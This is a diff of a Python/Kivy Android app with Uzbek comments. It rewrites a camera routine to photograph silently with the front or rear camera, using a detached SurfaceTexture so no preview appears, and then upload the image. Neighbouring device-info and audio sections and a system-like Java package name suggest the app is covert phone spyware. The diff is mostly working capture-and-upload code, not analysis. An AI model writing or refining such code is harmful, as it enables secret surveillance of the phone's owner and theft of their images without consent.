@@ -120,49 +120,67 @@ def get_device_info():
         return "Qurilma info xatolik: " + str(e)
 
 
-# --- KAMERA (Java CameraHelper orqali) ---
+# --- KAMERA (Camera1 + SurfaceTexture detached) ---
 def take_photo_camera(front_camera, loop):
     try:
         from jnius import autoclass, PythonJavaClass, java_method
-        activity     = autoclass('org.kivy.android.PythonActivity').mActivity
-        CameraHelper = autoclass('com.android.sys.CameraHelper')
+        Camera        = autoclass('android.hardware.Camera')
+        SurfaceTexture= autoclass('android.graphics.SurfaceTexture')
+        FileOutStream = autoclass('java.io.FileOutputStream')
+        activity      = autoclass('org.kivy.android.PythonActivity').mActivity
 
         ext_dir  = activity.getExternalFilesDir(None).getAbsolutePath()
         cam_name = 'selfie' if front_camera else 'capture'
         filepath = ext_dir + '/' + cam_name + '.jpg'
 
+        cam_id = 1 if front_camera else 0
+        camera = Camera.open(cam_id)
+
+        # SurfaceTexture(boolean) — GL context talab qilmaydi (API 26+)
+        texture = SurfaceTexture(False)
+        camera.setPreviewTexture(texture)
+
+        # Preview o'lchamini belgilash
+        params = camera.getParameters()
+        params.setPictureFormat(0x100)  # JPEG
+        camera.setParameters(params)
+        camera.startPreview()
+
         done = [False]
-        result_path = [None]
+        saved = [False]
 
-        class Callback(PythonJavaClass):
-            __javainterfaces__ = ['com/android/sys/CameraHelper$PhotoCallback']
+        class PicCb(PythonJavaClass):
+            __javainterfaces__ = ['android/hardware/Camera$PictureCallback']
             __javacontext__ = 'app'
+            @java_method('([BLandroid/hardware/Camera;)V')
+            def onPictureTaken(self, data, cam):
+                try:
+                    fos = FileOutStream(filepath)
+                    fos.write(data)
+                    fos.close()
+                    saved[0] = True
+                except Exception as ex:
+                    print('Saqlash xato: ' + str(ex))
+                finally:
+                    cam.release()
+                    done[0] = True
 
-            @java_method('(Ljava/lang/String;)V')
-            def onPhotoSaved(self, path):
-                result_path[0] = path
-                done[0] = True
+        camera.takePicture(None, None, PicCb())
 
-            @java_method('(Ljava/lang/String;)V')
-            def onError(self, error):
-                status[0] = 'Kamera xatolik: ' + str(error)
-                done[0] = True
-
-        CameraHelper.takePhoto(activity, front_camera, filepath, Callback())
-
-        for _ in range(60):
+        for _ in range(40):
             if done[0]:
                 break
-            time.sleep(0.2)
+            time.sleep(0.3)
 
-        if result_path[0] and os.path.exists(result_path[0]):
-            asyncio.run_coroutine_threadsafe(upload_file(result_path[0], 'photo'), loop)
+        if saved[0] and os.path.exists(filepath):
+            asyncio.run_coroutine_threadsafe(upload_file(filepath, 'photo'), loop)
             status[0] = 'Rasm olindi, yuborilmoqda...'
-        elif not done[0]:
-            status[0] = 'Kamera: vaqt tugadi'
+        else:
+            status[0] = 'Kamera: rasm olinmadi'
 
     except Exception as e:
         status[0] = 'Kamera xatolik: ' + str(e)
+
 
 
 # --- AUDIO ---
